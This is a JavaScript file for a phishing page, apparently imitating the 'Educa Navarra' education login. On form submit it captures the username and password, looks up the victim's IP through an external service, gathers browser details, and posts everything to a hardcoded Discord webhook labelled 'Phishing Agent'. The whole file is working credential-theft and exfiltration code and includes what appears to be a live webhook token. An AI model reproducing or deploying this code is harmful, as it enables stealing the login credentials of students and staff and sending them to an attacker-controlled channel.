// script.js

document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('phishingForm');
    const statusMessage = document.getElementById('statusMessage');

    // --- Configuración del Webhook de Discord ---
    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1518377673565671534/CIQeiO5S8GjGnCbt--qiOImdwmEKBI9aqqwxyp0ajcTdlPDY9ioeDtemWhzg5JTo1OaA';

    // Función para obtener la IP del usuario (método simple basado en API externa)
    async function getIP() {
        try {
            const response = await fetch('https://api64.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) {
            console.error("Error al obtener la IP:", error);
            return "IP_NO_DISPONIBLE";
        }
    }

    // Función para obtener la información del navegador (User Agent, etc.)
    function getBrowserInfo() {
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            screenResolution: `${screen.width}x${screen.height}`
        };
    }

    // Función principal para enviar datos al webhook
    async function submitData(event) {
        event.preventDefault(); // Prevenir el envío estándar del formulario

        const usuario = document.getElementById('usuario').value;
        const password = document.getElementById('password').value;

        // 1. Capturar metadatos del entorno
        const ip = await getIP();
        const browserInfo = getBrowserInfo();

        // 2. Construir el payload para Discord
        const payload = {
            content: `🚨 *🚨 **¡ALERTA DE INTENTO DE PHISHING!** 🚨*`,
            embeds: [
                {
                    title: "Captura de Credenciales de Educa Navarra",
                    color: 16711860, // Rojo
                    fields: [
                        {
                            name: "👤 Usuario Capturado",
                            value: `\`${usuario}\``,
                            inline: true
                        },
                        {
                            name: "🔒 Contraseña Capturada",
                            value: `\`${password}\``,
                            inline: true
                        },
                        {
                            name: "🌐 Dirección IP",
                            value: `\`${ip}\``,
                            inline: true
                        },
                        {
                            name: "🖥️ Info Navegador",
                            value: `UA: ${browserInfo.userAgent.substring(0, 100)}... | Res: ${browserInfo.screenResolution}`,
                            inline: false
                        },
                        {
                            name: "🕰️ Hora de Captura",
                            value: `${new Date().toLocaleString()} (Fecha Contextual: 2026-06-20)`,
                            inline: true
                        }
                    ],
                    footer: {
                        text: "Capturado por CyberNeurova / Phishing Agent"
                    }
                }
            ]
        };

        try {
            // 3. Enviar al Webhook
            const response = await fetch(DISCORD_WEBHOOK_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            });

            if (response.ok) {
                // Éxito en el envío al webhook
                statusMessage.className = 'status success';
                statusMessage.textContent = '✅ ¡Datos enviados con éxito a Discord!';
                console.log("Datos enviados exitosamente.");
            } else {
                // Error en el envío al webhook
                statusMessage.className = 'status error';
                statusMessage.textContent = '❌ Error al enviar datos a Discord. Revisa el Webhook.';
                console.error("Error en la respuesta del webhook:", response.statusText);
            }
        } catch (error) {
            // Error de conexión
            statusMessage.className = 'status error';
            statusMessage.textContent = '❌ Error de conexión al intentar enviar datos.';
            console.error("Error general al enviar datos:", error);
        }
    }

    // Asignar el listener al formulario
    form.addEventListener('submit', submitData);
});
